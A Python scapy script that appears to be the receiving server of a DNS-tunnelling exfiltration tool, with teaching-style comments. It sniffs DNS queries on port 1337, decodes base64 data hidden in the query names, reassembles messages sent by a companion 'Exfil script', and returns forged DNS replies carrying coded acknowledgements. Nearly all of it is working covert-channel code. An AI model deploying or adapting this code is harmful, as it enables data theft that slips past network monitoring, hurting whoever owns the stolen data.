from scapy.all import *
import socket
from base64 import b64decode
from time import sleep

def sendResponse(query,ip):
    question = query[DNS].qd
    # This is the DNS request defined as "query" in client-side DNSRequest function.
    answer = DNSRR(rrname=question.qname,ttl=1000,rdata=ip)
    # Defines the answer to specified question with one of three IP addresses defined in extractData function.
    response = Ether(src=query[Ether].dst,dst=query[Ether].src)/IP(src=query[IP].dst,dst=query[IP].src)/UDP(dport=query[UDP].sport,sport=1337)/DNS(id=query[DNS].id,qr=1,qdcount=1,ancount=1,qd=query[DNS].qd,an=answer)
    # Builds the response similarly to "p" in DNSRequest function on client side. "qr", "qdcount", "ancount" mean 1 question, 1 answer.
    sleep(1)
    # Only necessary on local host again. If this not specified, the answer can be sent before the request. haha
    sendp(response)
    # "p" only necessary on local host.

extracted = ""

def extractData(x):
    global extracted
    if x.haslayer(DNS) and x[UDP].dport == 1337:
    # Tests each packet for the expected specs from the Exfil script.
        domain = x[DNS].qd.qname
        # Pulls the fabricated URL with obfucated exfil packets created in Exfil script.
        ind = domain.index(bytes(".","utf-8"))
        data = domain[:ind]
        # These two lines remove the "main domain" section of the DNS packet, leaving only the disguised base64 encoded payload.
        padnum = (4-(len(data)%4))%4
        data += bytes("="*padnum,"utf-8")
        # These two replace the "=" padding removed in the Exfil script.
        try:
            decoded = b64decode(data).decode("utf-8")
            # Decodes the obfuscated "host" name.
            if decoded == "R":
                response = sendResponse(x,"10.0.0.2")
                print("End transmission")
                print(extracted)
                extracted = ""
            # "R" is the expected "end transmission" signal, so the full message is printed, and variable reset for next message.
            else:
                extracted += decoded
                response = sendResponse(x,"10.0.0.1")
        except Exception as e:
            print(e)
            response = sendResponse(x,"10.0.0.0")
        # The IP addresses are all different, because the final number is actually a coded message for the client.

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("",1337))
# s.listen(10) ... scapy will produce an error if nothing listens on the port traffic is being sent to. 
# So this open the port, but doesn't actually listen, doing away with the error.
sniff(prn=extractData)
# Instead scapy will sniff traffic and look inside each packet, using the created function extractData.
